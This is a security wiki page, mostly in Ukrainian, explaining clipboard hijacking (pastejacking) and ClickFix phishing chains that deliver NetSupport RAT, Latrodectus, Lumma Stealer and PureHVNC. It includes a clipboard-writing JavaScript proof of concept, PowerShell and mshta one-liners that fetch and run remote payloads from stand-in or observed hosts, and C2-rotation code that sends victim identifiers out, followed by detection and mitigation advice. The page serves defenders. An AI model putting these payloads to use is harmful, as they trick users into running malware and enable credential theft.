# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте те, що ви самі не копіювали." – стара, але досі слушна порада

## Огляд

Clipboard hijacking – also known as *pastejacking* – зловживає тим, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх.

Зловмисна веб-сторінка (або будь-який контекст, що підтримує JavaScript, наприклад Electron або десктопний застосунок) програмно поміщає текст, контрольований зловмисником, у системний буфер обміну.

Жертв зазвичай заохочують, за допомогою ретельно підготовлених інструкцій соціальної інженерії, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *вставити* вміст буфера обміну, що призводить до негайного виконання довільних команд.

Оскільки **ніякий файл не завантажується і жодне вкладення не відкривається**, ця техніка обходить більшість контролів безпеки електронної пошти та веб-контенту, які моніторять вкладення, макроси або пряме виконання команд. Тому атака популярна в phishing-кампаніях, що поширюють commodity malware сімейства, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## Потік ClickFix / ClearFake

1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад `docusign.sa[.]com`)
2. Інжектований JavaScript **ClearFake** викликає хелпер `unsecuredCopyToClipboard()`, який тихо зберігає у буфері обміну Base64-encoded PowerShell one-liner.
3. HTML-інструкції кажуть жертві: *“Натисніть **Win + R**, вставте команду і натисніть Enter, щоб вирішити проблему.”*
4. `powershell.exe` виконується, завантажуючи архів, який містить легітимний виконуваний файл та зловмисну DLL (класичний DLL sideloading).
5. Лоадер розшифровує додаткові стадії, інжектує shellcode і встановлює persistence (наприклад scheduled task) — в підсумку запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Зловмисний DLL динамічно отримує адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, дешифрує їх із використанням циклічного XOR-ключа `"https://google.com/"`, впроваджує фінальний shellcode і розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Запускає JScript downloader всередині **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаною програмою → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` та конкатенації файлів і, нарешті, запускає `.a3x` скрипт, який екзфільтрує облікові дані браузера на `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю пропускають завантаження файлів і просять жертв вставити one‑liner, який завантажує та виконує JavaScript через WSH, забезпечує персистентність і щодня змінює C2. Приклад спостереженої ланки:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- Obfuscated URL перевертається під час runtime, щоб ускладнити поверхневу інспекцію.
- JavaScript зберігає себе через Startup LNK (WScript/CScript) та обирає C2 за поточним днем — що дозволяє швидку ротацію доменів.

Мінімальний JS-фрагмент, що використовується для ротації C2s за датою:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює персистенцію та завантажує RAT (наприклад, PureHVNC), часто прив'язуючи TLS до жорстко вбудованого сертифікату і виконуючи chunking traffic.

Detection ideas specific to this variant
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript з JS шляхом під `%TEMP%`/`%APPDATA%`.
- Реєстр/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані виклики `powershell -NoProfile -NonInteractive -Command -` з великими stdin payloads, щоб підживити довгі скрипти без довгих командних рядків.
- Заплановані завдання, які пізніше виконують LOLBins, такі як `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під задачею/шляхом, що виглядає як оновлювач (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно-обертові C2 hostnames та URL-и з патерном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису в clipboard, за якими слідує вставка через Win+R і негайне виконання `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію **Win + R** команд – шукайте незвичні Base64 / obfuscated записи.
* Security Event ID **4688** (Process Creation), коли `ParentImage` == `explorer.exe` і `NewProcessName` у { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів під `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілою подією 4688.
* EDR clipboard sensors (if present) – корелюйте `Clipboard Write`, за яким негайно слідує новий процес PowerShell.

## Міри пом'якшення

1. Посилення налаштувань браузера – заборонити clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) або вимагати user gesture.
2. Підвищення обізнаності безпеки – навчіть користувачів *вводити* чутливі команди вручну або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control, щоб блокувати довільні одно-рядкові команди.
4. Мережеві контролі – блокувати вихідні запити до відомих доменів pastejacking та malware C2.

## Пов'язані трюки

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../../banners/hacktricks-training.md}}
